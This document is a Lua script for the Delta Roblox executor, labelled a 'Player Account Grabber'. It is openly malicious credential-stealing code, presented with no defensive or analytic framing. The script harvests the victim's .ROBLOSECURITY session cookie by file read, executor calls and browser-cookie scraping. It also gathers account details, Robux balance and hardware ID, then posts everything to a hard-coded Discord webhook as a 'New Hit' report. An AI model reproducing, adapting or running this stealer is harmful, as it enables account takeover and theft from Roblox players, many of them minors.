--// Delta Executor - Player Account Grabber
--// Paste your Discord webhook below

local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")

--// Utility
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
    if not success then
        -- fallback for different executor HTTP methods
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    end
end

--// Grab ROBLOSECURITY cookie (Delta supports this)
local function grabCookie()
    local cookie = ""
    pcall(function()
        -- Method 1: Direct filesystem read (Windows)
        local cookiePath = os.getenv("LOCALAPPDATA") 
            .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
        if isfile and isfile(cookiePath) then
            cookie = readfile(cookiePath)
        end
    end)
    
    pcall(function()
        -- Method 2: Registry pull via executor
        if getroblosecurity then
            cookie = getroblosecurity()
        elseif get_cookie then
            cookie = get_cookie()
        end
    end)

    -- Method 3: WebView / browser storage scrape
    if cookie == "" then
        pcall(function()
            local browser = getbrowser and getbrowser() or nil
            if browser then
                for _, c in pairs(browser:GetCookies("https://www.roblox.com")) do
                    if c.Name == ".ROBLOSECURITY" then
                        cookie = c.Value
                        break
                    end
                end
            end
        end)
    end

    return cookie
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    
    -- Grab Robux balance via API
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Hardware ID (if executor supports)
    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    -- Cookie field (split if too long for Discord embed)
    if cookie and cookie ~= "" then
        local cookieChunks = {}
        for i = 1, #cookie, 900 do
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

local playerInfo = getPlayerInfo()
local cookie = grabCookie()
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed)
print("[Delta] Payload delivered ✓")
